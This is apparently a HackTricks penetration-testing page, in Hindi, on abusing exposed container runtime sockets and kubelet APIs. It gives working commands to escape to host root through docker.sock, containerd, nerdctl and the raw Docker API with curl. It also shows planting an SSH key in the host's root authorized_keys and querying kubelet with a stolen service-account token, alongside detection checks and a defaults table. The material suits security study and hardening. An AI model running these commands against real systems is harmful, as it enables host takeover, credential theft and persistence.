# Runtime API और Daemon Exposure

## अवलोकन

कई वास्तविक container compromises namespace escape से बिल्कुल भी शुरू नहीं होते। वे runtime control plane तक पहुंच से शुरू होते हैं। यदि कोई workload mounted Unix socket या exposed TCP listener के माध्यम से `dockerd`, `containerd`, CRI-O, Podman या kubelet से संपर्क कर सकता है, तो attacker बेहतर privileges के साथ नया container बनाने, host filesystem mount करने, host namespaces में शामिल होने या sensitive node information प्राप्त करने में सक्षम हो सकता है। इन मामलों में runtime API ही वास्तविक security boundary होती है, और इसे compromise करना कार्यात्मक रूप से host को compromise करने के समान होता है।

इसीलिए runtime socket exposure को kernel protections से अलग document किया जाना चाहिए। सामान्य seccomp, capabilities और MAC confinement वाला container भी host compromise से केवल एक API call दूर हो सकता है, यदि `/var/run/docker.sock` या `/run/containerd/containerd.sock` उसके अंदर mounted हो। वर्तमान container का kernel isolation ठीक उसी तरह काम कर सकता है जैसा design किया गया है, जबकि runtime management plane पूरी तरह exposed रह सकता है।

## Daemon Access Models

Docker Engine पारंपरिक रूप से अपने privileged API को local Unix socket `unix:///var/run/docker.sock` के माध्यम से expose करता है। ऐतिहासिक रूप से इसे `tcp://0.0.0.0:2375` जैसे TCP listeners या `2376` पर TLS-protected listener के माध्यम से remotely भी expose किया गया है। Strong TLS और client authentication के बिना daemon को remotely expose करना Docker API को प्रभावी रूप से remote root interface में बदल देता है।

containerd, CRI-O, Podman और kubelet भी इसी तरह के high-impact surfaces expose करते हैं। इनके names और workflows अलग होते हैं, लेकिन logic समान रहता है। यदि interface caller को workloads create करने, host paths mount करने, credentials retrieve करने या running containers में बदलाव करने देता है, तो वह interface एक privileged management channel है और उसके अनुसार treat किया जाना चाहिए।

जिन common local paths को check करना चाहिए, वे हैं:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
पुराने या अधिक specialized stacks `dockershim.sock`, `frakti.sock` या `rktlet.sock` जैसे endpoints भी expose कर सकते हैं। आधुनिक environments में ये कम common हैं, लेकिन मिलने पर इनके साथ भी उतनी ही सावधानी बरतनी चाहिए, क्योंकि ये सामान्य application sockets के बजाय runtime-control surfaces को represent करते हैं।

## Secure Remote Access

यदि किसी daemon को local socket से बाहर expose करना आवश्यक हो, तो connection को TLS से protect किया जाना चाहिए और preferably mutual authentication का उपयोग करना चाहिए, ताकि daemon client को verify करे और client daemon को verify करे। सुविधा के लिए Docker daemon को plain HTTP पर खोलने की पुरानी आदत container administration की सबसे खतरनाक गलतियों में से एक है, क्योंकि API surface इतना powerful है कि यह सीधे privileged containers create कर सकता है।

ऐसा historical Docker configuration pattern दिखता था:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd-आधारित hosts पर, daemon communication `fd://` के रूप में भी दिखाई दे सकता है, जिसका अर्थ है कि process systemd से पहले से खुले हुए socket को inherit करता है, बजाय इसके कि वह स्वयं सीधे bind करे। महत्वपूर्ण बात exact syntax नहीं, बल्कि इसका security consequence है। जैसे ही daemon किसी कड़े permissions वाले local socket से आगे listen करता है, transport security और client authentication optional hardening के बजाय अनिवार्य हो जाते हैं।

## Abuse

यदि runtime socket मौजूद है, तो पुष्टि करें कि वह कौन-सा है, क्या कोई compatible client मौजूद है, और क्या raw HTTP या gRPC access संभव है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये dead path, mounted लेकिन inaccessible socket, और live privileged API के बीच अंतर स्पष्ट करते हैं। यदि client सफल होता है, तो अगला प्रश्न यह है कि क्या API host bind mount या host namespace sharing के साथ नया container launch कर सकता है।

### जब कोई Client Installed न हो

`docker`, `podman`, या किसी अन्य friendly CLI की अनुपस्थिति का अर्थ यह नहीं है कि socket सुरक्षित है। Docker Engine अपने Unix socket पर HTTP के माध्यम से संवाद करता है, और Podman `podman system service` के माध्यम से Docker-compatible API और Libpod-native API दोनों expose करता है। इसका अर्थ है कि केवल `curl` वाला minimal environment भी daemon को operate करने के लिए पर्याप्त हो सकता है:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
यह post-exploitation के दौरान महत्वपूर्ण है, क्योंकि defenders कभी-कभी सामान्य client binaries हटा देते हैं, लेकिन management socket को mounted छोड़ देते हैं। Podman hosts पर याद रखें कि high-value path rootful और rootless deployments के बीच अलग होता है: rootful service instances के लिए `unix:///run/podman/podman.sock` और rootless ones के लिए `unix://$XDG_RUNTIME_DIR/podman/podman.sock`।

### पूरा उदाहरण: Docker Socket से Host Root तक

यदि `docker.sock` reachable है, तो classical escape एक नया container शुरू करना है, जो host root filesystem को mount करे, और फिर उसमें `chroot` करे:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
यह Docker daemon के माध्यम से सीधे host-root execution प्रदान करता है। इसका impact केवल file reads तक सीमित नहीं है। नए container के अंदर आने के बाद attacker host files को बदल सकता है, credentials harvest कर सकता है, persistence implant कर सकता है या अतिरिक्त privileged workloads शुरू कर सकता है।

### पूरा उदाहरण: Docker Socket से Host Namespaces तक

यदि attacker filesystem-only access के बजाय namespace entry पसंद करता है:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
यह path वर्तमान container का exploit करने के बजाय runtime से explicit host-namespace exposure के साथ नया container बनाने का अनुरोध करके host तक पहुँचता है।

### Docker Socket Persistence Pattern

Runtime control का उपयोग one-shot shell के बजाय persistence के लिए भी किया जा सकता है। सामान्य pattern यह है कि host mount के साथ एक helper container बनाया जाए, mounted host filesystem में authorized access material या startup hook लिखा जाए, और फिर validate किया जाए कि host उसे consume करता है।

उदाहरण का रूप:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
वही विचार systemd units, cron fragments, application startup files या SSH keys को target कर सकता है, यह इस बात पर निर्भर करता है कि operator क्या साबित करना चाहता है। महत्वपूर्ण बात यह है कि persistent change runtime daemon की host-level filesystem authority के माध्यम से किया जाता है, न कि original container में अतिरिक्त privilege के माध्यम से।

### Raw Docker API Helper Pivot

जब Docker CLI उपलब्ध नहीं होता, तो वही host-mount helper flow Unix socket पर HTTP के माध्यम से चलाया जा सकता है। सामान्य flow यह है: API की पुष्टि करें, host bind mount के साथ एक helper container बनाएँ, उसे start करें, एक exec instance बनाएँ और उस exec को start करें।
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
अंतिम `/exec/<id>/start` request लौटाए गए exec ID पर निर्भर करती है, लेकिन security point सटीक JSON plumbing से स्वतंत्र है: rootful Docker daemon तक raw API access एक stronger helper workload request करने के लिए पर्याप्त है।

### पूर्ण उदाहरण: containerd Socket

Mounted `containerd` socket आमतौर पर उतना ही खतरनाक होता है:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
यदि अधिक Docker-जैसा client मौजूद हो, तो `nerdctl` `ctr` की तुलना में अधिक सुविधाजनक हो सकता है, क्योंकि यह `--privileged`, `--pid=host` और `-v` जैसे परिचित flags उपलब्ध कराता है:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
प्रभाव फिर से host compromise है। भले ही Docker-specific tooling मौजूद न हो, कोई अन्य runtime API फिर भी वही administrative power दे सकता है। Kubernetes nodes पर, `crictl` reconnaissance और container interaction के लिए पर्याप्त हो सकता है, क्योंकि यह सीधे CRI endpoint से बात करता है।

### BuildKit Socket

`buildkitd` को आसानी से नज़रअंदाज़ किया जा सकता है, क्योंकि लोग अक्सर इसे "सिर्फ build backend" समझते हैं, लेकिन daemon फिर भी एक privileged control plane होता है। किसी accessible `buildkitd.sock` से attacker arbitrary build steps चला सकता है, worker capabilities inspect कर सकता है, compromised environment से local contexts का उपयोग कर सकता है, और `network.host` या `security.insecure` जैसे dangerous entitlements का अनुरोध कर सकता है, जब daemon को इन्हें allow करने के लिए configured किया गया हो।

उपयोगी first interactions हैं:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
यदि daemon build requests स्वीकार करता है, तो जाँचें कि क्या insecure entitlements उपलब्ध हैं:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
सटीक प्रभाव daemon configuration पर निर्भर करता है, लेकिन permissive entitlements वाली rootful BuildKit service कोई harmless developer convenience नहीं है। इसे एक और high-value administrative surface मानें, खासकर CI runners और shared build nodes पर।

### Kubelet API Over TCP

kubelet कोई container runtime नहीं है, लेकिन यह node management plane का हिस्सा है और अक्सर उसी trust boundary discussion में आता है। यदि kubelet secure port `10250` workload से reachable है, या node credentials, kubeconfigs अथवा proxy rights exposed हैं, तो attacker Pods को enumerate करने, logs retrieve करने या node-local containers में commands execute करने में सक्षम हो सकता है—और इसके लिए Kubernetes API server admission path को छूने की भी आवश्यकता नहीं होती।

शुरुआत सस्ती discovery से करें:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
यदि kubelet या API-server proxy path `exec` को authorize करता है, तो WebSocket-capable client इसका उपयोग node पर मौजूद अन्य containers में code execution के लिए कर सकता है। यही कारण है कि केवल `get` permission वाला `nodes/proxy` भी सुनने से अधिक खतरनाक है: request अभी भी ऐसे kubelet endpoints तक पहुँच सकती है जो commands execute करते हैं, और वे direct kubelet interactions सामान्य Kubernetes audit logs में दिखाई नहीं देते।<sup>[[2]](#references)</sup>

## जाँच

इन जाँचों का लक्ष्य यह पता लगाना है कि क्या container किसी ऐसे management plane तक पहुँच सकता है, जिसे trust boundary के बाहर रहना चाहिए था।
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
यहाँ क्या महत्वपूर्ण है:

- Mounted runtime socket आमतौर पर केवल information disclosure नहीं, बल्कि एक सीधा administrative primitive होता है।
- TLS के बिना `2375` पर TCP listener को remote-compromise condition माना जाना चाहिए।
- `DOCKER_HOST` जैसे environment variables अक्सर यह प्रकट करते हैं कि workload को host runtime से बात करने के लिए जानबूझकर डिज़ाइन किया गया था।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से Local Unix socket | `dockerd` local socket पर listen करता है और daemon आमतौर पर rootful होता है | `/var/run/docker.sock` को mount करना, `tcp://...:2375` expose करना, `2376` पर कमजोर या अनुपस्थित TLS |
| Podman | डिफ़ॉल्ट रूप से Daemonless CLI | सामान्य local उपयोग के लिए किसी लंबे समय तक चलने वाले privileged daemon की आवश्यकता नहीं होती; `podman system service` enabled होने पर API sockets फिर भी expose किए जा सकते हैं | `podman.sock` expose करना, service को व्यापक रूप से चलाना, rootful API उपयोग |
| containerd | Local privileged socket | Administrative API local socket के माध्यम से expose होती है और आमतौर पर higher-level tooling द्वारा उपयोग की जाती है | `containerd.sock` को mount करना, व्यापक `ctr` या `nerdctl` access, privileged namespaces expose करना |
| CRI-O | Local privileged socket | CRI endpoint node-local trusted components के लिए intended है | `crio.sock` को mount करना, CRI endpoint को untrusted workloads के लिए expose करना |
| Kubernetes kubelet | Node-local management API | Kubelet को Pods से व्यापक रूप से reachable नहीं होना चाहिए; authentication और authorization के आधार पर access से pod state, credentials और execution features expose हो सकते हैं | kubelet sockets या certs को mount करना, कमजोर kubelet auth, host networking के साथ reachable kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
